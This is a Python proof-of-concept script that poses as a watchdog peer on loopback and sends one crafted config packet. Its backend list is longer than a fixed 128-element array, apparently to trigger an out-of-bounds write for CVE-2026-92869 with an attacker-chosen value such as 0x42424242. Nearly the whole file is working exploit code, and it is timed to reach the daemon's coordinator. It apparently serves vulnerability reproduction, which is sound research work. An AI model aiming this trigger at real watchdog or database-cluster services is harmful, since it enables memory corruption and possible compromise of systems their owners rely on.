#!/usr/bin/env python3
"""Synthetic loopback watchdog peer for the CVE-2026-92869 config lane.

Sends one WD_POOL_CONFIG_DATA ('Z') packet whose peer-controlled backend_desc
length exceeds the fixed 128-element array. Loopback only.
"""
import socket
import struct
import sys
import time

PORT = 19005
N = int(sys.argv[1]) if len(sys.argv) > 1 else 129
CHOSEN = sys.argv[2] if len(sys.argv) > 2 else "0x42424242"
DELAY = float(sys.argv[3]) if len(sys.argv) > 3 else 12.0

import subprocess
payload = subprocess.check_output(
    [sys.executable, __file__.replace("peer.py", "gen_config_json.py"),
     str(N), CHOSEN], text=True).strip()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.1", PORT))
s.listen(1)
print(f"peer listening 127.0.0.1:{PORT} N={N} chosen={CHOSEN} delay={DELAY}",
      flush=True)
conn, addr = s.accept()
print(f"peer accepted {addr}", flush=True)
conn.settimeout(0.5)
try:
    while True:
        d = conn.recv(4096)
        if not d:
            break
        print(f"peer recv {len(d)} bytes type={d[:1]!r}", flush=True)
except socket.timeout:
    pass
print(f"peer sleeping {DELAY}s so watchdog reaches coordinator", flush=True)
time.sleep(DELAY)
pkt = b"Z" + struct.pack("!II", 1, len(payload)) + payload.encode()
conn.sendall(pkt)
print(f"peer sent type=Z len={len(payload)}", flush=True)
conn.settimeout(3.0)
try:
    while True:
        d = conn.recv(4096)
        if not d:
            print("peer: daemon closed connection", flush=True)
            break
        print(f"peer recv after send {len(d)} bytes type={d[:1]!r}", flush=True)
except socket.timeout:
    print("peer: 3s idle after send", flush=True)
conn.close()
s.close()
